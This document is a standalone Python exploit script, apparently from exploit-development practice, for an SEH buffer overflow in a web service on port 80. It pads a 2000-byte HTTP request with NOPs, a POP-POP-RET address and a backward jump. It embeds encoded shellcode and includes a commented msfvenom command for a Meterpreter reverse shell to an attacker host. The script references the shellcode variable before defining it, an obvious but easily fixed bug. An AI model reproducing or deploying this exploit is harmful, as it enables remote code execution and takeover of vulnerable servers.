#!/usr/bin/python
import socket, sys
from struct import pack
host = sys.argv[1]
port = 80

# badchars => 0e, 00, 0f, 2f, 20, 0d
def send_exploit_request():

    # replace this
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<port> -b "\x00\x0e\x0f\x2f\x20\x0d\x0a" -f python -v "    shellcode" -e x86/shikata_ga_nai

    shellcode += b"\x90" * 3
    shellcode += b"\x66\x81\xEC\x30\x05\x66\x81\xEC\x30\x05"
    shellcode += b"\xb8\x1c\xc8\xdd\xaf\xd9\xcb\xd9\x74\x24"
    shellcode += b"\xf4\x5b\x31\xc9\xb1\x59\x31\x43\x14\x03"
    shellcode += b"\x43\x14\x83\xc3\x04\xfe\x3d\x21\x47\x71"
    shellcode += b"\xbd\xda\x98\xed\x8f\x08\xfc\x66\xbd\x9c"
    shellcode += b"\x74\x9d\xc9\x8f\x8a\xd6\x9c\x3b\x9c\x5f"
    shellcode += b"\x6a\x62\x93\x60\xe0\x18\xfb\xaf\x37\x70"
    shellcode += b"\xc7\xae\xcb\x8b\x14\x10\xf5\x43\x69\x51"
    shellcode += b"\x32\x12\x07\xbe\xee\xf2\x6c\x12\x1f\x76"
    shellcode += b"\x30\xae\x1e\x58\x3e\x8e\x58\xdd\x81\x7a"
    shellcode += b"\xd5\xdc\xd1\x09\xbd\xfe\xd0\xde\x6e\x74"
    shellcode += b"\x9a\xf8\x0b\x43\x6f\xc4\x22\xab\xd9\xbf"
    shellcode += b"\x71\xd8\xdb\x69\x48\x1e\x77\x54\x64\x93"
    shellcode += b"\x89\x91\x43\x4c\xfc\xe9\xb7\xf1\x07\x2a"
    shellcode += b"\xc5\x2d\x8d\xac\x6d\xa5\x35\x08\x8f\x6a"
    shellcode += b"\xa3\xdb\x83\xc7\xa7\x83\x87\xd6\x64\xb8"
    shellcode += b"\xbc\x53\x8b\x6e\x35\x27\xa8\xaa\x1d\xf3"
    shellcode += b"\xd1\xeb\xfb\x52\xed\xeb\xa4\x0b\x4b\x60"
    shellcode += b"\x46\x5d\xeb\x89\x98\x62\xb1\x1d\x54\xaf"
    shellcode += b"\x4a\xdd\xf2\xb8\x39\xef\x5d\x13\xd6\x43"
    shellcode += b"\x15\xbd\x21\xd2\x31\x3e\xfd\x5c\x51\xc0"
    shellcode += b"\xfe\x9c\x7b\x07\xaa\xcc\x13\xae\xd3\x87"
    shellcode += b"\xe3\x4f\x06\x3d\xee\xc7\x69\x69\xc3\xc7"
    shellcode += b"\x02\x6b\x1c\xe9\x69\xe2\xfa\xb9\xdd\xa4"
    shellcode += b"\x52\x7a\x8e\x04\x03\x12\xc4\x8b\x7c\x02"
    shellcode += b"\xe7\x46\x15\xa9\x08\x3e\x4d\x46\xb0\x1b"
    shellcode += b"\x05\xf7\x3d\xb6\x63\x37\xb5\x32\x93\xf6"
    shellcode += b"\x3e\x37\x87\xef\x58\xb7\x57\xf0\xcc\xb7"
    shellcode += b"\x3d\xf4\x46\xe0\xa9\xf6\xbf\xc6\x75\x08"
    shellcode += b"\xea\x55\x71\xf6\x6b\x6f\x09\xc1\xf9\xcf"
    shellcode += b"\x65\x2e\xee\xcf\x75\x78\x64\xcf\x1d\xdc"
    shellcode += b"\xdc\x9c\x38\x23\xc9\xb1\x90\xb6\xf2\xe3"
    shellcode += b"\x45\x10\x9b\x09\xb3\x56\x04\xf2\x96\xe4"
    shellcode += b"\x43\x0c\x64\xc3\xeb\x64\x96\x53\x0c\x74"
    shellcode += b"\xfc\x53\x5c\x1c\x0b\x7b\x53\xec\xf4\x56"
    shellcode += b"\x3c\x64\x7e\x37\x8e\x15\x7f\x12\x4e\x8b"
    shellcode += b"\x80\x91\x4b\x3c\xfa\xda\x6c\xbd\xfb\xf2"
    shellcode += b"\x08\xbe\xfb\xfa\x2e\x83\x2d\xc3\x44\xc2"
    shellcode += b"\xed\x70\x56\x71\x53\xd0\xfd\x79\xc7\x22"
    shellcode += b"\xd4"

    buffer = b"\x90" * (1236 - len(shellcode))
    buffer += shellcode
    buffer += pack("<L", (0x06eb9090))
    buffer += pack("<L", (0x100294ed)) # PPR
    buffer += b"\x90" * 4
    buffer += b"\xE9\x28\xFB\xFF\xFF"
    buffer += b"\x90" * (2000 - len(buffer) - len(shellcode))
    # HTTP Request
    request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
#    print(s.recv(1024))
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
